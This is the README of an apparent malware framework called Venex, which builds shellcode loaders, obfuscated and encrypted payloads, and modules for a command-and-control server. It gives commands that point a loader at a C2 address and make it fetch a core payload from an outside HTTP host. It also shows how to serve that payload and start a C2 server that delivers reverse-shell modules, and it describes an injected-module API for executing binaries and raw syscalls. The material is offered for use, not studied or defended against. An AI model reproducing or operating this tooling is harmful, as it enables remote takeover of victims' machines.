# Venex 0.4 Test Version

> Note: English is not perfect, but this README will guide you through usage and structure.

## Overview

Venex is a test framework (v0.4) for creating and handling modules, shellcode, and encrypted payloads. This is an early version, so some functionality is limited.

### Directory Structure

* `/gostinit` - Contains initialization files (source code not provided; only for experienced users).
* `/tools/bin` - Main tools you will use.

### Tools

| Tool             | Description                           | Note                                                |
| ---------------- | ------------------------------------- | --------------------------------------------------- |
| `encrypt.exe`    | Encrypt data                          | Do not touch unless making a module                 |
| `obfuscater.exe` | Obfuscate data                        | Do not touch unless making a module                 |
| `hash.exe`       | Generate hashes                       | Do not touch unless making a module                 |
| `gostmsf.exe`    | Generate shellcode (Shellcode Engine) | This is the main tool for testing/debugging loaders |

## Using `gostmsf.exe`

Command syntax:

```bash
./gostmsf.exe "c2 IP_ADDRESS PORT" "curl string for loader e.g. http://99.88.77.66:5555/core.bin"
```

* Core part stored in: `/xMain/core/core.bin`
* Run a simple HTTP server to serve core:

```bash
python -m http.server 5555
```

* Start C2 testing server:

```bash
c2 /server/server.exe
```

> Note: Server only sends encrypted module (e.g., msf revshellcode, 74 bytes). Not safe for production.

## Creating Modules (<512 bytes)

* Limited functionality, v0.1 tested.
* Each function has an MBA (Module Base Address).

  * Address of function = function address - 5

### API Table

| Index | Function       | Description                                |
| ----- | -------------- | ------------------------------------------ |
| 0     | base           | Helps calculate address: `base + func RVA` |
| 1     | gostEncrypt    | Encrypt anything                           |
| 2     | gostExecute    | Execute any binary                         |
| 3     | gostGetSyscall | Get syscall number                         |
| 4     | gostEXESyscall | Execute syscall instruction                |
| 5     | gostPrint      | Print to client (secure, encrypted)        |
| 6     | gostSend       | Same as gostPrint                          |

### Calling Functions

* `rax` points to API table structure.
* Example call:

```nasm
mov rbp, [rax + <index>*8]  ; Load function pointer
add rbp, [rax]               ; Calculate final address
call rbp                     ; Call the function
```

> End of README for Venex 0.4 Test Version.
